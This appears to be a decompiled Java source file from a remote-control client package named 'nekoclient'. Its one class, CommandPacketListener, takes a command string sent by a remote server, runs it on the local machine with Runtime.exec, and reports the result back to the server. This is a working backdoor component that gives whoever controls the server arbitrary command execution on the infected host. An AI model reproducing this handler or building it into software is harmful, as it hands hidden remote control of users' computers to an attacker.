package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.packet.impl.client.ActionResponsePacket;
import dev.neko.nekoclient.packet.impl.server.CommandPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class CommandPacketListener implements PacketListener<CommandPacket> {
   public void call(CommandPacket packet, Client client, String id) throws IOException {
      try {
         Process process = Runtime.getRuntime().exec(packet.getCommand());
         process.waitFor(1L, TimeUnit.SECONDS);
         client.send(
            new ActionResponsePacket(
               packet.getNonce(),
               process.isAlive() || process.exitValue() >= 0 && process.getInputStream().available() >= process.getErrorStream().available()
            )
         );
      } catch (InterruptedException | ArrayIndexOutOfBoundsException | IOException var5) {
         client.send(new ActionResponsePacket(packet.getNonce(), false));
      }
   }
}
